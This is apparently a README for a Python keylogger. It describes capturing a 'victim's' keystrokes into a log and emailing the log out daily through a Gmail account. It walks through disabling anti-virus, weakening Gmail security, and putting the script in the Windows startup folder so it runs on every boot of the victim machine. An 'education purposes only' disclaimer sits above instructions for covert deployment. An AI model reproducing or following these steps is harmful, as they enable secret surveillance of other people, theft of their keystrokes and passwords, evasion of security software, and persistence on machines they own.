# Python Keylogger
**Disclaimer:** This project is for education purposes only! I'm not responsible for any unethical use of my code.

This script copies the victim's keystrokes and inputs them into a log file. From here, it sends an email every day with the log file attached.

**Note:** This script will be detected as a keylogger by anti-virus so, you'll need to disable that.

---
#### Update Variables
Before running the script, you'll need to update the below variables in the [keylogger script](/keylogger.py):
- **s_email** to your sender's email
- **s_pwd** to your sender's password
- **r_email** to your recipient's email
- **log_dir** to the directory where your log file will be stored (optional) 

---
#### Configuring Gmail
Under your Gmail account, go to **Security** and turn on **Less secure app access**

![image](https://user-images.githubusercontent.com/70701922/140437395-f1e503f7-28b0-415a-961a-396d29f02d7b.png)
---
#### Auto Startup
In Windows type **Windows_key+R** then **shell:startup**. In this new window, drag and drop your keylogger script. This will automatically run your script every time the victim machine turns on.

![image](https://user-images.githubusercontent.com/70701922/140437834-e3f34e13-115f-4c41-8c37-3553afe25417.png)


Done! 
